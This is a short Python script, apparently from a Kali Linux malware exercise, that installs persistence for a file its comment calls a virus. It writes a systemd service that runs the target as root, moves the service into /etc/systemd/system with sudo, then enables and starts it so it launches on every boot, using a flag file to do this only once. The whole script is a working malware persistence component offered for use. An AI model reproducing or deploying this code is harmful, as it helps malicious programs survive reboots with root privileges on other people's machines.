#!usr/bin/python3
import os
path=os.path.dirname(__file__)+'/t.py' # add name of virus.exe
s=0
x=open("/home/kali/Documents/true.txt","r")
y=x.read()
if( y=='True\n'):
		f=open("/home/kali/Documents/startup2.service","w")
		f.write("[Unit]\nDescription= StartUp\n\n\n[Service]\nExecStart="+path+" start\nUser=root\nRemainAfterExit=yes\n\n\n[Install]\nWantedBy = multi-user.target\n")
		f.close()
		os.system('sudo mv /home/kali/Documents/startup2.service /etc/systemd/system/') #put service with sys services

		os.system('sudo systemctl --system daemon-reload')

		os.system('sudo chown root:root /etc/systemd/system/startup2.service')

		os.system('sudo chmod 755 /etc/systemd/system/startup2.service')

		os.system('sudo systemctl enable startup2.service') # activate the service so it could be start in each reboot

		os.system('sudo systemctl start startup2.service') # start the service == lance the .exe file
		#os.system('sudo systemctl status startup2.service') # this command u can execute it to verify if the service started ( see the status of the service )
		#os.system('sudo systemctl stop startup2.service') # to stop the service for this time
		#os.system('sudo systemctl disable startup2.service') # to stop the service from starting in each reboot
		x=open("/home/kali/Documents/true.txt","w")
		x.write("False")
		x.close
		
else:
	
		print("hello")
